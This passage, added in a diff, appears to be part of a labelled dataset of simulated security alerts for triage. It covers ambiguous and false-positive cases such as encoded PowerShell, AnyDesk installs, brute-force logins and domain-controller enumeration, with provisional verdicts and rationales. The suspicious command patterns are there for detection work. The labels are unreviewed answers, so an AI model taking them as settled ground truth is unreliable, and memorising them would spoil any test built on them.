+          "host": "app-srv-04",
+          "process_name": "7z.exe",
+          "command_line": "7z.exe a -pVendor2026 C:\\temp\\ticket-48213-logs.7z D:\\App\\logs\\*"
+        }
+      ]
+    },
+    {
+      "id": "fp-dev-curl-download",
+      "kind": "false_positive",
+      "title": "Developer's build script uses curl in cmd to fetch a toolchain",
+      "story": "Build tooling download from the vendor's HTTPS site.",
+      "visible_evidence": "cmd.exe /c curl from nodejs.org by a developer, parent_process build.bat",
+      "labels": {
+        "malicious": false,
+        "severity": "informational",
+        "action": "suppress"
+      },
+      "label_confidence": "medium",
+      "rationale": "Normal developer tooling from a reputable HTTPS source.",
+      "review": "pending",
+      "events": [
+        {
+          "timestamp": "2026-09-16T09:40:00Z",
+          "outcome": "success",
+          "category": "process",
+          "action": "process_start",
+          "user": "devon",
+          "host": "lt-eng-03",
+          "process_name": "cmd.exe",
+          "command_line": "cmd.exe /c curl -fsSLo node.zip https://nodejs.org/dist/v22.9.0/node-v22.9.0-win-x64.zip",
+          "parent_process": "build.bat"
+        }
+      ]
+    },
+    {
+      "id": "amb-success-from-new-ip",
+      "kind": "ambiguous",
+      "title": "Successful login from an unfamiliar residential IP",
+      "story": "Could be travel or a home ISP change, could be a stolen session.",
+      "visible_evidence": "single login_success from an address not seen before, no failures, business hours",
+      "labels": {
+        "malicious": false,
+        "severity": "low",
+        "action": "enrich"
+      },
+      "label_confidence": "low",
+      "rationale": "Nothing malicious observed; needs identity/geo context before judging.",
+      "review": "pending",
+      "events": [
+        {
+          "timestamp": "2026-09-17T10:00:00Z",
+          "outcome": "success",
+          "category": "authentication",
+          "action": "login_success",
+          "user": "priya",
+          "src_ip": "203.0.113.140",
+          "host": "sso"
+        }
+      ]
+    },
+    {
+      "id": "amb-finance-anydesk-offhours",
+      "kind": "ambiguous",
+      "title": "Finance user installs AnyDesk at 10pm",
+      "story": "Classic tech-support-scam pattern, or a user fixing their own machine.",
+      "visible_evidence": "AnyDesk.exe from the Downloads folder by a finance user, late evening",
+      "labels": {
+        "malicious": true,
+        "severity": "medium",
+        "action": "investigate"
+      },
+      "label_confidence": "medium",
+      "rationale": "Unsanctioned remote access on a finance endpoint is worth a call.",
+      "review": "pending",
+      "events": [
+        {
+          "timestamp": "2026-09-18T22:05:00Z",
+          "outcome": "success",
+          "category": "process",
+          "action": "process_start",
+          "user": "priya",
+          "host": "ws-201",
+          "process_name": "AnyDesk.exe",
+          "command_line": "C:\\Users\\priya\\Downloads\\AnyDesk.exe"
+        }
+      ]
+    },
+    {
+      "id": "amb-admin-encoded-powershell",
+      "kind": "ambiguous",
+      "title": "IT admin runs encoded PowerShell interactively",
+      "story": "Admins sometimes paste encoded one-liners; attackers do too.",
+      "visible_evidence": "powershell -enc by it-marco on the IT laptop, business hours, no parent tooling",
+      "labels": {
+        "malicious": false,
+        "severity": "low",
+        "action": "enrich"
+      },
+      "label_confidence": "low",
+      "rationale": "Probably admin work, but encoded commands hide intent; confirm with the admin.",
+      "review": "pending",
+      "events": [
+        {
+          "timestamp": "2026-09-19T11:30:00Z",
+          "outcome": "success",
+          "category": "process",
+          "action": "process_start",
+          "user": "it-marco",
+          "host": "lt-it-01",
+          "process_name": "powershell.exe",
+          "command_line": "powershell.exe -enc RwBlAHQALQBTAGUAcgB2AGkAYwBlACAAfAAgAFMAZQBsAGUAYwB0AA=="
+        }
+      ]
+    },
+    {
+      "id": "amb-failed-logins-no-success",
+      "kind": "ambiguous",
+      "title": "Eight failed logins from one external IP, no success",
+      "story": "A brute-force attempt that did not work.",
+      "visible_evidence": "eight login_failed for one user from 198.51.100.200 and no subsequent success",
+      "labels": {
+        "malicious": true,
+        "severity": "low",
+        "action": "monitor"
+      },
+      "label_confidence": "medium",
+      "rationale": "Hostile, but unsuccessful; watch for a follow-up success.",
+      "review": "pending",
+      "events": [
+        {
+          "timestamp": "2026-09-20T03:00:00Z",
+          "outcome": "failure",
+          "category": "authentication",
+          "action": "login_failed",
+          "user": "omar",
+          "src_ip": "198.51.100.200",
+          "host": "vpn-1"
+        },
+        {
+          "timestamp": "2026-09-20T03:01:00Z",
+          "outcome": "failure",
+          "category": "authentication",
+          "action": "login_failed",
+          "user": "omar",
+          "src_ip": "198.51.100.200",
+          "host": "vpn-1"
+        },
+        {
+          "timestamp": "2026-09-20T03:02:00Z",
+          "outcome": "failure",
+          "category": "authentication",
+          "action": "login_failed",
+          "user": "omar",
+          "src_ip": "198.51.100.200",
+          "host": "vpn-1"
+        },
+        {
+          "timestamp": "2026-09-20T03:03:00Z",
+          "outcome": "failure",
+          "category": "authentication",
+          "action": "login_failed",
+          "user": "omar",
+          "src_ip": "198.51.100.200",
+          "host": "vpn-1"
+        },
+        {
+          "timestamp": "2026-09-20T03:04:00Z",
+          "outcome": "failure",
+          "category": "authentication",
+          "action": "login_failed",
+          "user": "omar",
+          "src_ip": "198.51.100.200",
+          "host": "vpn-1"
+        },
+        {
+          "timestamp": "2026-09-20T03:05:00Z",
+          "outcome": "failure",
+          "category": "authentication",
+          "action": "login_failed",
+          "user": "omar",
+          "src_ip": "198.51.100.200",
+          "host": "vpn-1"
+        },
+        {
+          "timestamp": "2026-09-20T03:06:00Z",
+          "outcome": "failure",
+          "category": "authentication",
+          "action": "login_failed",
+          "user": "omar",
+          "src_ip": "198.51.100.200",
+          "host": "vpn-1"
+        },
+        {
+          "timestamp": "2026-09-20T03:07:00Z",
+          "outcome": "failure",
+          "category": "authentication",
+          "action": "login_failed",
+          "user": "omar",
+          "src_ip": "198.51.100.200",
+          "host": "vpn-1"
+        }
+      ]
+    },
+    {
+      "id": "amb-it-dc-enumeration",
+      "kind": "ambiguous",
+      "title": "IT admin enumerates domain controllers and computers",
+      "story": "Inventory work, or an admin account being used for recon.",
+      "visible_evidence": "nltest /dclist and Get-ADComputer by it-marco from the IT laptop, business hours",
+      "labels": {
+        "malicious": false,
+        "severity": "informational",
+        "action": "suppress"
+      },
+      "label_confidence": "medium",
+      "rationale": "Expected from the IT admin account and host.",
+      "review": "pending",
+      "events": [
+        {
+          "timestamp": "2026-09-21T10:00:00Z",
+          "outcome": "success",
+          "category": "process",
+          "action": "process_start",
+          "user": "it-marco",
+          "host": "lt-it-01",
+          "process_name": "nltest.exe",
+          "command_line": "nltest /dclist:acme.local"
+        },
+        {
+          "timestamp": "2026-09-21T10:02:00Z",
+          "outcome": "success",
+          "category": "process",
+          "action": "process_start",
+          "user": "it-marco",
+          "host": "lt-it-01",
+          "process_name": "powershell.exe",
+          "command_line": "powershell.exe Get-ADComputer -Filter * | Measure-Object"
+        }
+      ]
+    }
+  ]
+}
